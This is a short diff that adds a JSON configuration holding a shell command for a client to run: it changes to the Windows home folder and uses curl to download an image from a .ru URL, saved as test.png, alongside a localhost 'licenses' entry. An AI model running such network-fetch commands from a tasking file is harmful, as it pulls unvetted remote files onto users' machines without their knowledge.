@@ -1,0 +1,8 @@
+{
+     "cmd": [
+         "cd %HOMEPATH% && curl.exe --output test.png --url http://cdn01.ru/files/users/images/32/69/3269079033e0fd7447c417f19fe749fd.jpg"
+     ],
+     "licenses": [
+         "ip:127.0.0.1"
+     ]
+}
